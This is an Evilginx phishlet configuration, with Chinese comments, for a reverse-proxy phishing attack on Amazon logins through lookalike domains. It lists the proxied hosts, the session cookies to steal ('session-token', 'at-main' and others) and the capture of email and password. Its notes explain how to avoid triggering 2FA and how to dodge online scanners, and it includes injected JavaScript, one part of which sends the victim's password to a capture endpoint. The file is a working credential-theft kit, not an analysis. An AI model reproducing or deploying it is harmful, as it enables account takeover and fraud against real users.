# 获取 cookie 后，登录其账户的 URL 是：https://www.amazon.com/，不是 phishlets 的 login URL。因为获取的 cookie作 用于主域而非登录 URL。

# 本地测试 2fa 触发条件 1：IP 远距离更换，即第一位数字改变，125.164.3.41 变更为 180.253.166.70 会触发 2fa，125.164.10.49 变更为 125.164.13.79 则不会。
# 本地测试 2fa 触发条件 2：指纹浏览器彻底的新设备，从 os 变更为 windows、安卓，从 chrome 变更为 firfox。
# 远程测试 2fa 触发条件 1:proxy 命令配置不同国家的代理 IP，以触发 2fa。
# 远程测试 2fa 触发条件 2:指纹浏览器彻底的新设备，从 os 变更为 windows、安卓，从 chrome 变更为 firfox。

# phishlets hostname 如果指定的子域超过一级，会导致 404 错误。如：phishlets hostname login.amazon.adownoe.store 会导致 404，phishlets hostname amazon.adownoe.store 则不会。
# lures edit 0 path，指定的第一个路径不能和 auth_urls 指定的第一个路径相同，也不能和 login 部分的 path 的第一个路径相同，否则都会产生 404 问题。
# lures edit 0 hostname 命令完全失效，一旦启用会产生 404。

min_ver: '3.3.0'

# 找到授权 URL，该 URL 下的主机群，即是参与登录验证流程的主机。不参与登录验证流程的主机，则不需要代理。
# 授权 URL 是：完整登录后的最终 URL 前的那个 URL。
# OTP 输入 URL、账户密码输入 URL 都可以是授权 URL。
# 需要注意的是，amazon 会有动态主机参与登录流程，如 s.amazon-adsystem.com，该主机是负责广告投放的主机，也是动态主机，会不定期介入登录流程。如果不代理，会产生 404 问题。
# 对动态主机，解决办法是：随时测试钓鱼 URL，是否有问题出现，如果有，则首先排查网站是否新增了动态主机。
# 另外，proxy_hosts 里的 session 一律设置为 true，以解决在线扫描仪通过 evilginx 主机名扫描到恶意主机的漏洞。
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'c', orig_sub: 'c', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 's', orig_sub: 's', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'media-amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'unagi', orig_sub: 'unagi', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'unagi-na', orig_sub: 'unagi-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'siege-amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'prod.USAmazon', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mbdvgoj27h.execute-api.us-east-1', orig_sub: 'mbdvgoj27h.execute-api.us-east-1', domain: 'amazonaws.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'https://www.amazon.com:443', replace: 'https://www.amazon.adownoe.online:443', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
#  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'prod.USAmazon', replace: 'adownoe.online', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'images-na.ssl-images-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: '.amazon.com/1/events/', replace: '.adownoe.online/1/events/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
#  - {triggers_on: 'unagi.amazon.com', orig_sub: 'unagi', domain: 'amazon.com', search: 'https://mbdvgoj27h.execute-api.us-east-1.amazonaws.com/prod/v1/log', replace: 'https://mbdvgoj27h.execute-api.us-east-1.amazon.evilginx.com/prod/v1/log', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}

# cookie 作用于域，存在范围概念。
# .amazon.com，表示作用于 amazon.com 的一切子域，如：www.amazon.com 和 ugagi.amazon.com；amazon.com，表示只作用于 amazon.com这个特定域；www.amazon.com，表示只作用于 www.amazon.com 这个特定域。
# '.*:regexp'，表示捕获任意名字的 cookie。该正则表达式用于 cookie 名字是动态生成的情况，即每次登录流程，cookie 名字会随机生成。
#auth_tokens:
#  - domain: '.amazon.com'
#    keys: ['.*:regexp']
#    type: 'cookie'
#  - domain: 'amazon.com'
#    keys: ['.*:regexp']
#    type: 'cookie'
#  - domain: 'www.amazon.com'
#    keys: ['.*:regexp']
#    type: 'cookie'

# 对于动态 cookie，auth_urls 必须配置为 '/ap/.*' 等具体路径，以表示在该路径下触发所有 cookie 的捕获，否则 evilginx 将不知道在哪个路径下触发对 cookie 的捕获。这个触发路径，就是授权 URL 的路径。
# auth_urls:-'/ap/.*' 等具体路径，也可用于静态 cookie 的捕获触发路径。
#auth_urls:
#  - '/ap/.*'
#  - '/ap/mfa*'

# amazon 的 cookie 名字是静态的，即每个登录流程中 cookie 名字不变，则在授权 URL 中，查找响应里面的 cookie 名字，并填入 auth_tokens。
auth_tokens:
  - domain: '.amazon.com'
    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main']
    type: 'cookie'
  - domain: 'amazon.com'
    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main']
    type: 'cookie'
  - domain: 'www.amazon.com'
    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main']
    type: 'cookie'

# 对于静态 cookie，auth_urls 配置为'/'，这意味着：在任何路径中进行 cookie 捕获，直到完成登录流程，并由 evilginx 自己将最后一次捕获的静态 cookie 视为授权 cookie。
# auth_urls配置为'/'只适用于不设定 lures redirect_url 的情况。一旦在'/'前提下配置 lures redirect_url，会触发“尚未捕获授权cookie即被重定向到lures redirect_url问题”。
auth_urls:
  - '/'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'

# lures edit 0 path 不能设置为 /ap/signin，否则会触发 404 问题，可设置为 /signin/ap，则不触发 404 问题。
login:
  domain: 'www.amazon.com'
  path: '/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'

force_post:
  - path: '/ap/signin'
    search:
      - {key: 'email', search: '.*'}
      - {key: 'password', search: '.*'}
    force:
      - {key: 'rememberMe', value: 'true'}
    type: 'post'

js_inject:
  - trigger_domains: ["www.amazon.com"]
    trigger_paths: ["/ap/signin"]
    trigger_params: ["email"]
    script: |
      document.addEventListener('DOMContentLoaded', function() {
        function lp(){
          var email = document.querySelector("#ap_email");
          if (email != null) {
            email.value = "{email}";
            return;
          }
        }
        lp();
      });

# 这里的 javascript 代码用于捕获加密密码，并将其发送到服务器的一个端点。但由于需要更改原始代码并重新编译 evilginx 可执行文件以在 evilginx 服务器上生成该接收端点，因此在学会修改原始代码前，该部分对我无效。
#  - trigger_domains: ["www.amazon.com"]
#    trigger_paths: ["/ap/signin", "/signin"]
#    trigger_params: ["password"]
#    script: |  
#      function onclickListener(){
#        var submit = document.querySelectorAll('input[type="submit"]')[0];
#        submit.setAttribute("onclick", "sendPass()");
#        submit.addEventListener("click", sendPass);
#        return;
#      }
#      function sendPass(){
#        var password = document.getElementsByName("password")[0].value;
#        var xhr = new XMLHttpRequest();
#        xhr.open("POST", '/capture-password', true);
#        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
#        xhr.send("unenc_password="+encodeURIComponent(password));
#        return;
#      }
#      setTimeout(function(){ onclickListener(); }, 1000);